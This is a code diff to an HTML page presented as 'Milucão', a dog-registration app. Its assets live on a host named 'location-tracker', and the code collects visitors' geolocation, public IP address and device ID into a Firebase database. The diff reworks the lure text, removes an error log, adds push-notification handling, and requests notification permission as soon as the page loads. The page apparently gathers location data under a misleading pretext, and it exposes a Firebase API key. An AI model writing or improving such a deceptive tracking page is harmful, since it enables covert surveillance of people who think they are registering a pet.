@@ -146,7 +146,7 @@
             display: none;
             font-size: 14px;
             line-height: 1.5;
-            margin-top: 10px;
+            margin-bottom: 15px;
         }
 
         .error.active {
@@ -158,33 +158,79 @@
             font-size: 14px;
             color: var(--color-slate-900);
         }
+
+        .notification-banner {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            max-width: 350px;
+            display: none;
+            animation: slideIn 0.3s ease;
+            z-index: 9999;
+        }
+
+        .notification-banner.active {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .notification-title {
+            font-weight: 600;
+            color: #218085;
+            margin-bottom: 8px;
+        }
+
+        .notification-body {
+            color: #64748b;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://location-tracker-pi-jade.vercel.app/milucao.jpeg" alt="Milucão" class="thumbnail" id="thumbnailBtn">
         
-        <h1>Milucão - IA cuidando do seu cão</h1>
-        <p class="subtitle">Autorize as permissões para melhor experiencia</p>
+        <h1>Milucão - O app do amigão</h1>
+        <p class="subtitle">Autorize a localização para cadastrar seu amigão com segurança.</p>
 
         <div class="button-group">
             <button class="btn-primary" id="getLocationBtn">
-                <span>🐶 Cadastre seu Aumicão</span>
+                <span>🐶 Cadastre seu Amicão</span>
             </button>
         </div>
 
         <div class="loading" id="loading">
             <span class="spinner"></span>
-            Iniciando cadastro...
+            Coletando dados...
         </div>
 
         <div class="error" id="error"></div>
         <div class="success-message" id="successMessage"></div>
     </div>
 
+    <div class="notification-banner" id="notificationBanner">
+        <div class="notification-title" id="notificationTitle">Notificação</div>
+        <div class="notification-body" id="notificationBody">Mensagem aqui</div>
+    </div>
+
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js';
-        import { getDatabase, ref, push, set } from 'https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js';
+        import { getDatabase, ref, push, set, onValue } from 'https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js';
+        import { getMessaging, onMessage } from 'https://www.gstatic.com/firebasejs/11.0.1/firebase-messaging.js';
 
         const firebaseConfig = {
             apiKey: "AIzaSyAueHmQZ8DbpOl2ZnS4p7zw5kLyNGJ4K8o",
@@ -198,6 +244,7 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
+        const messaging = getMessaging(app);
 
         function getDeviceId() {
             let deviceId = localStorage.getItem('deviceId');
@@ -230,7 +277,6 @@
                 const data = await response.json();
                 return data.ip;
             } catch (e) {
-                console.error('Erro ao obter IP público', e);
                 return 'Não disponível';
             }
         }
@@ -250,6 +296,14 @@
         function clearMessages() {
             document.getElementById('error').classList.remove('active');
             document.getElementById('successMessage').textContent = '';
+        }
+
+        function showNotification(title, body) {
+            const banner = document.getElementById('notificationBanner');
+            document.getElementById('notificationTitle').textContent = title;
+            document.getElementById('notificationBody').textContent = body;
+            banner.classList.add('active');
+            setTimeout(() => banner.classList.remove('active'), 5000);
         }
 
         async function captureLocation() {
@@ -301,16 +355,16 @@
 
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            message = '❌ Permissão negada. O navegador precisa ter permissão.';
+                            message = '❌ Permissão negada. O navegador precisa ter permissão para acessar sua localização.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            message = '❌ Verifique sua conexão.';
+                            message = '❌ Informações de localização não disponíveis. Verifique sua conexão.';
                             break;
                         case error.TIMEOUT:
-                            message = '❌ Tempo limite atingido. Tente novamente.';
+                            message = '❌ Tempo limite atingido ao obter a localização. Tente novamente.';
                             break;
                         default:
-                            message = '❌ Erro desconhecido.';
+                            message = '❌ Erro desconhecido ao tentar obter sua localização.';
                     }
 
                     showError(message);
@@ -327,8 +381,21 @@
             window.open('https://location-tracker-pi-jade.vercel.app/milucao.jpeg', '_blank');
         }
 
+        // Listener para notificações em tempo real (página aberta)
+        onMessage(messaging, (payload) => {
+            console.log('📢 Mensagem recebida:', payload);
+            if (payload.notification) {
+                showNotification(payload.notification.title, payload.notification.body);
+            }
+        });
+
         document.getElementById('getLocationBtn').addEventListener('click', captureLocation);
         document.getElementById('thumbnailBtn').addEventListener('click', openPhoto);
+
+        // Solicitar permissão para notificações
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
     </script>
 </body>
 </html>
